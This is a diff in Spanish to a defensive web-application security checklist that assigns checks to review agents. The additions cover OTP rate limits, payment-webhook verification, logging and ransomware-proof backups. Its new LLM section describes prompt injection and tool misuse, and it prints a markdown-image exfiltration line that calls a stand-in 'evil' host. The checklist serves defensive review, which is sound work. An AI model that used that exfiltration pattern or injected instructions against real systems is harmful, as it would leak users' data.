@@ -13,10 +13,10 @@ Estados por chequeo: ✅ cumple · ❌ falla · ⚠️ parcial · N/A no aplica 
 
 | Agente | Chequeos |
 |---|---|
-| `infra-secretos` | 1, 2, 3, 16, 17, 19, 20, X5, X6, X7, X8, X9 |
-| `acceso` | 4, 5, 6, 10, 11, 12, X4 |
-| `entradas` | 7, 8, 9, 13, 14, 15, 18, X1, X2, X3 |
-| `pentester` | confirma en vivo cualquier chequeo; dueño en vivo de 11, 16, 17, 18; herramientas: matriz de permisos (4–6), JWT (5), carrera y flujos (X4), fuzzing (7, 19) |
+| `infra-secretos` | 1, 2, 3, 16, 17, 19, 20, X5, X6, X7, X8, X9, X12 |
+| `acceso` | 4, 5, 6, 10, 11, 12, X4, X10 |
+| `entradas` | 7, 8, 9, 13, 14, 15, 18, X1, X2, X3, X11 |
+| `pentester` | confirma en vivo cualquier chequeo; dueño en vivo de 11, 16, 17, 18; herramientas: matriz de permisos (4–6), JWT (5), carrera y flujos (X4), fuzzing (7, 19), códigos cortos (11), webhook sin firma (X10), chatbot (X11) |
 
 ---
 
@@ -54,6 +54,10 @@ tablas. Usuario de DB de la app sin superusuario ni DDL. Retención y borrado re
 **11. Rate limiting — ALTA.** Login, registro, recuperación, envío de códigos/SMS/WhatsApp/correo, formularios
 públicos y endpoints caros (LLM, exportaciones). Por IP **real** (detrás de Cloudflare: `CF-Connecting-IP` de un proxy
 confiable) y por cuenta. Formularios públicos con anti-bot (Turnstile).
+**Códigos cortos** (OTP de 4–6 dígitos, códigos de recuperación, de verificación de correo, cupones o PIN): límite de
+intentos **por código** (≤ 5, luego se invalida y hay que pedir otro), caducidad corta (≤ 10 min), comparación en tiempo
+constante y el mismo límite aunque el atacante cambie de IP. Un código de 6 dígitos sin límite de intentos se
+adivina con un script → CRÍTICA si da acceso a la cuenta.
 
 **12. Límite de gasto — ALTA.** Toda API de pago con tope y alerta en el proveedor + límite por usuario en la app.
 Endpoints que gastan dinero nunca anónimos. El tope del proveedor no se ve en el código → ❓ con pregunta.
@@ -98,7 +102,8 @@ salvo decisión explícita.
 
 **20. Config de producción — ALTA.** Dependencias sin CVE conocidas (`pip-audit`, `npm audit`), lockfile versionado,
 contenedor como usuario no root e imagen slim, puertos de DB/Redis/paneles **no** publicados, sin contraseñas por
-defecto, respaldos configurados y probados, logs sin secretos ni datos personales completos.
+defecto, respaldos configurados y probados (que además resistan un ransomware: ver X12), logs sin secretos ni
+datos personales completos.
 
 ## Extras (lo que un senior revisa aunque no esté en la lista)
 
@@ -111,14 +116,20 @@ por URL) → lista blanca de hosts, bloquear IPs privadas/metadatos, sin seguir 
 **X3. Path traversal / open redirect — ALTA/MEDIA.** Rutas de archivo o redirecciones construidas con datos del usuario.
 
 **X4. Lógica de negocio — ALTA.** Condiciones de carrera en saldos/puntos/canjes, pasos de un flujo que se pueden
-saltar, precios o cantidades que manda el cliente, códigos reutilizables, inyección de prompt en funciones con LLM
-que tienen herramientas o datos de otros usuarios.
+saltar, precios, descuentos o cantidades que manda el cliente (el total se recalcula en el servidor desde la base),
+cupones y códigos reutilizables o canjeables en paralelo. Webhooks de pago → X10. Funciones con LLM → X11.
 
 **X5. CI/CD y cadena de suministro — MEDIA.** Workflows de GitHub Actions con `pull_request_target` + checkout del
 PR, acciones sin fijar, secretos expuestos a forks, scripts `postinstall` sospechosos.
 
-**X6. Registro y monitoreo — MEDIA.** Se registran logins fallidos, cambios de rol y acciones de admin; hay alerta
-de caída (monitor de uptime) y de errores.
+**X6. Registro y monitoreo — MEDIA (ALTA si no hay ningún registro de autenticación ni de acciones de admin).**
+Un ataque típico pasa semanas adentro sin que nadie lo vea. Mínimo:
+- Se registran logins (éxito y fallo), recuperación de contraseña, cambios de rol/correo/contraseña, acciones de admin,
+  pagos y webhooks recibidos, con usuario, IP real y hora, **sin** contraseñas, tokens ni datos personales completos.
+- Los logs salen del servidor (proveedor de logs, Cloudflare Logpush, syslog remoto): un atacante con el servidor
+  no debe poder borrarlos. Retención ≥ 90 días.
+- Alertas: caída (monitor de uptime), picos de errores 5xx, ráfagas de logins fallidos, nuevo admin creado.
+Lo que no se ve en el código (retención, alertas del proveedor) → ❓ con pregunta.
 
 **X7. Superficie de ataque — ALTA si hay takeover o un entorno interno expuesto.** Subdominios descubiertos por
 Certificate Transparency y nombres típicos (`scripts/subdominios.sh`): ningún staging/dev/admin/panel público sin
@@ -132,3 +143,41 @@ Dominio que no envía correo: `v=spf1 -all` + `v=DMARC1; p=reject`. Sin esto cua
 En Access, **Include** es «o»: si trae `Everyone`, un método de login (One-time PIN, GitHub…), un dominio público
 (`gmail.com`) o un grupo con eso, la lista de correos de al lado no protege nada. Lo que acota va en **Require** o se quita.
 Ejemplo típico: Include = [One-time PIN, 3 correos] → cualquier correo entra al panel «protegido».
+
+**X10. Webhooks de pago — CRÍTICA.** Un endpoint que marca pedidos como pagados, acredita saldo o activa planes
+cuando llega un webhook (Stripe, Mercado Pago, PayPal, Conekta, Lemon Squeezy, Paddle…). Si cualquiera puede mandarle
+un POST, cualquiera se marca como pagado. Debe:
+- **verificar la firma** con el secreto del webhook y el cuerpo **crudo** (Stripe `construct_event`/`constructEvent`,
+  Mercado Pago `x-signature` HMAC-SHA256, PayPal `verify-webhook-signature`), con comparación en tiempo constante y
+  ventana de tiempo (rechaza eventos de hace > 5 min);
+- o, si el proveedor no firma, **volver a consultar el pago a su API** con el ID del evento antes de dar nada;
+- ser **idempotente** (guardar el ID del evento; el mismo evento dos veces = una sola acreditación);
+- confirmar **monto, moneda y pedido** contra la base (no confiar en el monto del evento sin cruzarlo);
+- nunca aceptar "pagado" desde el navegador (la página de éxito `?status=approved` no prueba nada).
+El secreto del webhook va en variables de entorno (chequeo 2), separado por entorno (test/producción).
+
+**X11. Funciones con LLM (chatbots, asistentes, agentes) — ALTA (CRÍTICA si filtra datos de otros usuarios o
+ejecuta acciones).** Todo texto que llega al modelo (el mensaje, un documento, una página, un correo, una reseña)
+puede traer instrucciones. Revisa:
+- **System prompt sin secretos**: ni claves, ni códigos de descuento internos, ni datos de clientes. Hay que suponer
+  que se filtra.
+- **Herramientas (tools/function calling)**: cada herramienta aplica la autorización del **usuario de la sesión**
+  en el servidor (no la que diga el modelo); IDs ajenos → rechazo. Acciones que cambian datos o gastan dinero
+  (reembolsos, descuentos, cambiar rol, enviar correos) piden confirmación del usuario o están fuera del alcance del modelo.
+- **RAG / memoria**: los documentos recuperados se filtran por usuario/tenant **antes** de dárselos al modelo.
+- **Salida del modelo = dato no confiable**: nunca a `innerHTML`/`v-html`/`|safe`, SQL, shell, `eval` ni URLs que el
+  servidor visite (chequeos 8, 9, X1, X2). Markdown con imágenes remotas puede exfiltrar datos (`![](https://evil/?d=…)`).
+- **Gasto**: endpoint con sesión, rate limit y `max_tokens` (chequeos 11 y 12).
+Las defensas tipo "no obedezcas instrucciones del usuario" en el prompt **no cuentan** como control.
+
+**X12. Respaldos a prueba de ransomware — ALTA.** El ransomware cifra o borra el servidor **y** los respaldos que
+alcanza. Un respaldo cuenta solo si:
+- se hace automático (diario o mejor) y **se probó restaurarlo** (fecha de la última prueba);
+- hay una copia **fuera del servidor** y en otra cuenta/proveedor;
+- es **inmutable o de solo agregar**: Object Lock / retención en S3, R2 o B2, snapshots con bloqueo, o credenciales
+  que pueden escribir pero **no borrar**; las credenciales del respaldo no están en el servidor de la app con
+  permiso de borrado;
+- tiene versiones de varios días (un cifrado detectado tarde no se lleva todas las copias);
+- las cuentas del hosting, la base y el almacenamiento tienen 2FA.
+Casi nada de esto se ve en el código → ❓ con preguntas concretas (dónde, cada cuánto, quién puede borrarlos,
+última restauración probada).
